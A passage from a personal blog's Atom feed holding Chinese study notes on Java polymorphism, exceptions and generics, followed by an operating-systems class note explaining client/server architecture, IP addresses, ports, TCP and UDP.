    <published>2024-03-21T13:44:57.000Z</published>
    <updated>2024-04-15T10:46:57.067Z</updated>
    
    <content type="html"><![CDATA[<h1 id="协变返回类型"><a href="#协变返回类型" class="headerlink" title="协变返回类型"></a>协变返回类型</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>&#x3D;&#x3D;定义&#x3D;&#x3D;</p><p>导出类中被覆盖的方法可以返回积累芳芳的返回类型的某种到处类型</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//polymorphism/CovariantReturn.java</span></span><br><span class="line"><span class="keyword">package</span> polymorphism;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grain</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;Grain&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Wheat</span> <span class="keyword">extends</span> <span class="title class_">Grain</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;Wheat&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mill</span> &#123;</span><br><span class="line">  Grain <span class="title function_">process</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Grain</span>(); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WheatMill</span> <span class="keyword">extends</span> <span class="title class_">Mill</span> &#123;</span><br><span class="line">  Wheat <span class="title function_">process</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Wheat</span>(); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CovariantReturn</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Mill</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mill</span>();</span><br><span class="line">    <span class="type">Grain</span> <span class="variable">g</span> <span class="operator">=</span> m.process();</span><br><span class="line">    System.out.println(g);</span><br><span class="line">    m = <span class="keyword">new</span> <span class="title class_">WheatMill</span>();</span><br><span class="line">    g = m.process();</span><br><span class="line">    System.out.println(g);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="comment">/* Output:</span></span><br><span class="line"><span class="comment">Grain</span></span><br><span class="line"><span class="comment">Wheat</span></span><br><span class="line"><span class="comment">*/</span><span class="comment">//:~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stage</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="type">Actor</span> <span class="variable">actor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HappyActor</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">()</span> &#123; actor = <span class="keyword">new</span> <span class="title class_">SadActor</span>(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">performPlay</span><span class="params">()</span> &#123; actor.act(); &#125;</span><br></pre></td></tr></table></figure><h2 id="纯继承模式"><a href="#纯继承模式" class="headerlink" title="纯继承模式"></a>纯继承模式</h2><blockquote>只有在基类中出现的方法才可以在导出类中定义，是一种纯粹的“is a"关系<blockquote>扩展接口可定义为”is-like-a"关系<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//: polymorphism/RTTI.java</span></span><br><span class="line"><span class="comment">// Downcasting &amp; Runtime type information (RTTI).</span></span><br><span class="line"><span class="comment">// &#123;ThrowsException&#125;</span></span><br><span class="line"><span class="keyword">package</span> polymorphism;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Useful</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;Userful:f()&quot;</span>);&#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">g</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;Userful:g()&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MoreUseful</span> <span class="keyword">extends</span> <span class="title class_">Useful</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;MoreUseful:f()&quot;</span>);&#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">g</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;MoreUseful:g()&quot;</span>);&#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">u</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;MoreUseful:u()&quot;</span>);&#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">v</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;MoreUseful:v()&quot;</span>);&#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">w</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;MoreUseful:w()&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RTTI</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    Useful[] x = &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Useful</span>(),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">MoreUseful</span>()</span><br><span class="line">    &#125;;</span><br><span class="line">    x[<span class="number">0</span>].f();</span><br><span class="line">    x[<span class="number">1</span>].g();</span><br><span class="line">    <span class="comment">// Compile time: method not found in Useful:</span></span><br><span class="line">    <span class="comment">//x[1].u();</span></span><br><span class="line">    ((MoreUseful)x[<span class="number">1</span>]).u(); <span class="comment">// Downcast/RTTI</span></span><br><span class="line">  <span class="comment">//  ((MoreUseful)x[0]).u(); // Exception thrown</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (x[<span class="number">0</span>] <span class="keyword">instanceof</span> MoreUseful)</span><br><span class="line">    &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;ttt&quot;</span>);</span><br><span class="line">    <span class="type">MoreUseful</span> <span class="variable">mf</span> <span class="operator">=</span> (MoreUseful) x[<span class="number">0</span>];</span><br><span class="line">    mf.u();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="comment">///:~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;对象不能向上转型，类型才能向上转型。&#x3D;&#x3D;</p><p>&#x3D;&#x3D;内存分析&#x3D;&#x3D; </p><p>“<a href="https://blog.csdn.net/qq_43582566/article/details/121909107">Java多态的向上转型——内存分析_向上转型内存结构-CSDN博客</a>“</p><h1 id="java的异常处理机制"><a href="#java的异常处理机制" class="headerlink" title="java的异常处理机制"></a>java的异常处理机制</h1><h2 id="throws"><a href="#throws" class="headerlink" title="throws"></a>throws</h2><p><img src="/2024/03/%E5%8D%8F%E5%8F%98%E8%BF%94%E5%9B%9E%E7%B1%BB%E5%9E%8B/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20231220165420962.png" alt="image-20231220165420962"></p><p><b>例</b>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">calculate</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException&#123;</span><br><span class="line"><span class="type">int</span> c[]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">c[<span class="number">5</span>]=<span class="number">60</span>;</span><br><span class="line"><span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;a=&quot;</span>+a);</span><br><span class="line">    <span class="type">int</span> b=<span class="number">50</span>/a;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalAccessException</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">calculate();</span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">catch</span> (IllegalAccessException e)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;非法存取&quot;</span>+e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="泛型编程"><a href="#泛型编程" class="headerlink" title="泛型编程"></a>泛型编程</h1><p>功能类似于cpp中的模板,作用是提高代码的复用率</p><p>例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">calculate</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException&#123;</span><br><span class="line"><span class="type">int</span> c[]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">c[<span class="number">5</span>]=<span class="number">60</span>;</span><br><span class="line"><span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;a=&quot;</span>+a);</span><br><span class="line">    <span class="type">int</span> b=<span class="number">50</span>/a;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalAccessException</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">calculate();</span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">catch</span> (IllegalAccessException e)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;非法存取&quot;</span>+e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><blockquote><p>泛型是带一个或则和多个类型参数的类</p></blockquote><p>eg </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> generics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Box</span>&lt;T&gt; &#123;</span><br><span class="line"><span class="keyword">private</span> T  t;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(T  t)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.t = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> T  <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>  t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">Box&lt;String&gt; box = <span class="keyword">new</span> <span class="title class_">Box</span>();</span><br><span class="line">    Box&lt;Integer&gt; box1 = <span class="keyword">new</span> <span class="title class_">Box</span>&lt;Integer&gt;();</span><br><span class="line">box.add(<span class="string">&quot;hello&quot;</span>);     <span class="comment">//box.add(100);</span></span><br><span class="line">System.out.println(box.get());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>泛型类的使用与方法调用类似。 ¡ 方法调用需向方法传递参数，使用泛型需传递一个类型参 数，即用某个具体的类型替换T。 要在Box对象中存放String对象，就要在创建Box对象时为其 传递String类型参数。 ¡ 要实例化泛型类对象，也使用new运算符，但在类名和括 号之间需加上要传递的具体类型，</p><blockquote><p>例如： &#x2F;&#x2F;在JDK 1.7之前，创建泛型对象时的写法 BoxGenerics box &#x3D; new BoxGenerics(); </p></blockquote><blockquote><p>&#x2F;&#x2F;在JDK 1.7之后，创建泛型对象时的写法 BoxGenerics box &#x3D; new BoxGenerics(); </p></blockquote><p>按照约定，类型参数名使用单个大写字母表示。常用的类 型参数名（标记符）有：E表示元素，K表示键，N表示数字，T 表示类型，V表示值，？等</p></blockquote><blockquote><p>当没有指定模板类型时，会默认当成object对像</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class REG1 &#123;</span><br><span class="line">public static void main(String[] args)</span><br><span class="line">&#123;</span><br><span class="line">    CE c3=new CE();</span><br><span class="line">    c3.x=5;</span><br><span class="line">    c3.y=10;</span><br><span class="line">    System.out.println(c3.toString());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/%E5%8D%8F%E5%8F%98%E8%BF%94%E5%9B%9E%E7%B1%BB%E5%9E%8B/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20231222144704812.png" alt="image-20231222144704812"></p><p>当定义数组时，不能直接定义,需要用以下方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//CE&lt;Integer,Double&gt;[] carry1=new CE&lt;Integer,Double&gt;[5];</span></span><br><span class="line">CE&lt;Integer,Double&gt;[] carry2=<span class="keyword">new</span> <span class="title class_">CE</span>[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    carry2[i]=<span class="keyword">new</span> <span class="title class_">CE</span>&lt;Integer,Double&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><h4 id="类型擦除"><a href="#类型擦除" class="headerlink" title="类型擦除"></a>类型擦除</h4><p>在泛型代码内部，无法获得任何有关泛型参数的信息。 ¡ 当泛型类型实例化时，编译器使用一种叫类型擦除的技术 转换这些类型。在编译时，编译器将清除类和方法中的所 有与类型参数有关的信息。 ¡ Java考虑到兼容问题，使用擦除实现泛型，意味着泛型使 用时，任何具体的类型信息都被擦除了，唯一知道的就是 你在使用一个对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErasedTypeEquivalence</span> &#123; <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>().getClass(); <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>().getClass(); System.out.println(c1 == c2); <span class="comment">//True or False？ &#125; &#125; //generics.ErasedTypeEquivalence.java 35 //: generics/LostInformation.java</span></span><br></pre></td></tr></table></figure><h4 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h4><blockquote><p><u>边界通配符</u> <code>? super Apple</code> 表示传入apple整个类及其以上的父类。</p><p><u>边界通配符</u> <code>? extend Apple</code> 表示传入apple整个类及其以下的子类。</p></blockquote><ul><li><p>1.上界不能往里存，只能往外取 编译器只知道容器里的是Fruit或者Fruit的子类，但不 知道它具体是什么类型，所以存的时候，无法判断是否要存 入的数据的类型与容器种的类型一致，所以会拒绝set操作。 </p></li><li><p>2.下界往外取只能赋值给Object变量，不影 响往里存 因为编译器只知道它是Fruit或者它的父类，这样实际上 是放松了类型限制，Fruit的父类一直到Object类型的对象 都可以往里存，但是取的时候，就只能当成Object对象使用 了。</p></li><li><p>所以如果需要经常往外读，则使用，如果需 要经常往外取，则使用。</p></li></ul><p>  [＜? extend T＞和＜? super T＞的解释_-CSDN博客](<a href="https://blog.csdn.net/qq_58746475/article/details/119887000?ops_request_misc=%7B%22request_id%22:%22170323034416800222821634%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170323034416800222821634&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-119887000-null-">https://blog.csdn.net/qq_58746475/article/details/119887000?ops_request_misc=%7B%22request%5Fid%22%3A%22170323034416800222821634%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=170323034416800222821634&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-119887000-null-</a>null.142^v96^pc_search_result_base9&amp;utm_term&#x3D; extend &amp;spm&#x3D;1018.2226.3001.4187)”</p><blockquote><p><u>无界通配符</u>  使用无界通配符指定一个未知类型 “？” 。 ？ 与&#x3D;&#x3D;? extend Apple&#x3D;&#x3D;具有相同的含义，表示任何类 型。</p></blockquote><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><ul>泛型也可以用于接口<ul><li>实现泛型接口时，如果不生命类型，那么泛型自动变为object</li><li>如果想保留接口中的泛型，则在实现剋的声明时，必须保留泛型接口中的泛型声明</li><li>也可以在是实现时，直接给定接口泛型中的具体类型</li></ul><h4 id="使用泛型需要注意的问题"><a href="#使用泛型需要注意的问题" class="headerlink" title="使用泛型需要注意的问题"></a>使用泛型需要注意的问题</h4><ul><li>任何基本类型都不能作为类型参数</li><li>实现参数化接口，由于擦除，一个类不能实现同一 泛型接口的两种变体</li><li>转型与警告：使用带泛型类型参数的转型， instanceof无任何效果，因为擦除</li><li>方法重载：类型参数不能识别</li></ul></ul></blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;协变返回类型&quot;&gt;&lt;a href=&quot;#协变返回类型&quot; class=&quot;headerlink&quot; title=&quot;协变返回类型&quot;&gt;&lt;/a&gt;协变返回类型&lt;/h1&gt;&lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Java" scheme="https://ycx6666.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://ycx6666.github.io/tags/Java/"/>
    
    <category term="协变" scheme="https://ycx6666.github.io/tags/%E5%8D%8F%E5%8F%98/"/>
    
  </entry>
  
  <entry>
    <title>操作系统第四组第二次小班课</title>
    <link href="https://ycx6666.github.io/2024/03/%E5%A4%A7%E7%BA%B2%20-%20%E5%89%AF%E6%9C%AC/"/>
    <id>https://ycx6666.github.io/2024/03/%E5%A4%A7%E7%BA%B2%20-%20%E5%89%AF%E6%9C%AC/</id>
    <published>2024-03-21T13:44:57.000Z</published>
    <updated>2024-04-15T10:46:11.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统第四组第二次小班课"><a href="#操作系统第四组第二次小班课" class="headerlink" title="操作系统第四组第二次小班课"></a>操作系统第四组第二次小班课</h1><blockquote><p>代码实现利用多进程实现 C&#x2F;S 模式聊天程序，启动一个服务器，单个和多个客户端，服务端接收到新的客户端请求就创建一个进程与客户端通信。</p></blockquote><h2 id="CS-架构和-BS-架构"><a href="#CS-架构和-BS-架构" class="headerlink" title="CS 架构和 BS 架构"></a>CS 架构和 BS 架构</h2><p>常见的软件架构有两种：CS、BS。不管是哪种，真正的核心处理逻辑都是在服务器上：</p><ol><li><p>CS：Client&#x2F;Server（客户端 &#x2F; 服务器），采取这种架构的软件，在用户本地需要下载并安装客户端程序，在远程有一个服务器端程序。比如：QQ、steam。</p><p>优点：事先下载好所有资源，用户体验好。缺点：需要开发客户端和服务端，开发、部署、维护麻烦，服务端更新时，客户端也需要更新。CS架构适合定制专业化的办公类软件。</p></li><li><p>BS：Brower&#x2F;Server（浏览器 &#x2F; 服务器），采取这种架构时，只需要一个浏览器，用户通过不同的网址就可以访问不同的服务器。比如：京东、淘宝（网页端）。</p><p>优点：方便，不需要开发客户端，只需要页面+服务端，且只需要打开浏览器就可以使用。缺点：需要通过网络传输所有的图片、音频资源，如果资源过大，则会降低用户体验。BS架构适合移动互联网应用。</p></li></ol><h2 id="网络编程三要素"><a href="#网络编程三要素" class="headerlink" title="网络编程三要素"></a>网络编程三要素</h2><p>当我们要向另外一台计算机发送信息时，我们要知晓对方电脑在互联网上的地址（<strong>IP</strong>），还需要确定对方电脑接受数据的软件（<strong>端口号</strong>，一个端口号只能被一个软件绑定使用），还需要确定网络传输的规则（<strong>协议</strong>）。故<strong>IP、端口号、协议</strong>就是网络编程三要素。</p><p><strong>网络编程三要素</strong>：</p><ol><li>IP：设备在网络中的地址，是唯一的标识。</li><li>端口号：应用程序在设备中唯一的标识。</li><li>协议：数据在网络中传输的规则，常见的协议有 UDP、TCP、http、https、ftp。</li></ol><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>全称：Internet Protocol，是互联网协议地址，也称IP地址。是分配给上网设备的数字标签。常见的IP分为：ipv4、ipv6。</p><p>IPv4：全称为Internet Protocol version 4，即互联网通信协议第四版。采用<strong>32位地址长度</strong>，<strong>分成4组（每组1字节，8位）</strong>。一般用<strong>点分十进制表示法</strong>，例如：<code>192.168.1.66</code>。每一组最大值是255，最小值是0。在IPv4中，每一组有256种表示方法，一共4组，最多可以表示 $256^4 &#x3D; 4294967296$ 种地址，数量有限，不够使用。实际上，在2019年11月26日，IPv4的全部可用地址就已经分配完毕了。</p><p>IPv6：全称为Internet Protocol version 6，即互联网通信协议第六版。由于互联网的蓬勃发展，IP地址的需求量越来越大，而IPv4模式下的IP总数有限，为了让地址能够继续分配，故出现了IPv6。采用<strong>128位地址长度，分成8组（每组2字节，16位）</strong>。一共有 $2^{128} &#x3D; 3.04\times10^{38}$ 种地址，这个数量，可以给地球上的每一粒沙子都编上号。一般用<strong>冒分十六进制表示法</strong>，例如：<code>2001:0DB8:0000:0023:0008:0800:200C:417A</code>。对于每一组，可以省略前导0，此时，对于上述IP地址，可以记录为：<code>2001:DB8:0:23:8:800:200C:417A</code>。此外，还有一种特殊情况：<strong>0位压缩表示法</strong>。即如果计算出的16进制表示形式中有多个连续的0，可以利用<code>::</code>进行压缩表示，例如对于<code>FF01:0:0:0:0:0:0:1101</code>，我们可以压缩为：<code>FF01::1101</code>。</p><p>上述是对于IPv4和IPv6的基本介绍，现对IPv4进行额外补充。</p><p>IPv4的地址分类形式有两种：一种是公网地址（万维网使用），一种是私有地址（局域网使用）。<code>192.168.</code>开头的就是私有地址，范围即为<code>192.168.0.0--192.168.255.255</code>，专门为组织机构内部使用，通过共享公网IP以此节省IP。</p><p>一个特殊的IP地址为：<code>127.0.0.1</code>，又称localhost。是回送地址，也叫本地回环地址，又称本机IP。永远只会寻找当前所在的本机。换个地方上网，局域网IP可能不一样，因为这个是通过路由器分配的。通过localhost，可以保证自己给自己发送数据时不出错。</p><h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><p>应用程序在设备中唯一的标识。<strong>一个端口号只能被一个应用程序使用。</strong></p><p>端口号是由两个字节表示的整数，取值范围：0-65535。其中0-1023之间的端口号是用于一些知名的网络服务或者应用。我们自己使用1024以上的端口号就可以了。</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>计算机网络中，连接和通信的规则被称作网络通信协议。</p><p>OSI参考模型：世界互联协议标准，全球通信规范，单模型过于理想化，未能在因特网上进行广泛推广。</p><p>TCP &#x2F; IP 参考模型：事实上的国际标准。</p><h4 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h4><p>用户数据报协议（User Datagram Protocol），是<strong>面向无连接</strong>（不管两台计算机是否建立连接，直接传输数据）通信协议。速度快，有大小限制，一次最多发送64K，数据不安全，易丢失数据。应用场景：网络会议、语音通话、在线视频。（丢失数据的影响不大）</p><h4 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h4><p>传输控制协议（Transmission Control Protocol），是<strong>面向连接</strong>的通信协议。速度慢，没有大小限制，数据安全。应用场景：下载软件、文字聊天、发送邮件。（丢失数据影响较大）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;操作系统第四组第二次小班课&quot;&gt;&lt;a href=&quot;#操作系统第四组第二次小班课&quot; class=&quot;headerlink&quot; title=&quot;操作系统第四组第二次小班课&quot;&gt;&lt;/a&gt;操作系统第四组第二次小班课&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;代码实现利用多进程实现 C</summary>
      
    
    
    
    <category term="小班" scheme="https://ycx6666.github.io/categories/%E5%B0%8F%E7%8F%AD/"/>
    
    
    <category term="操作系统" scheme="https://ycx6666.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
</feed>
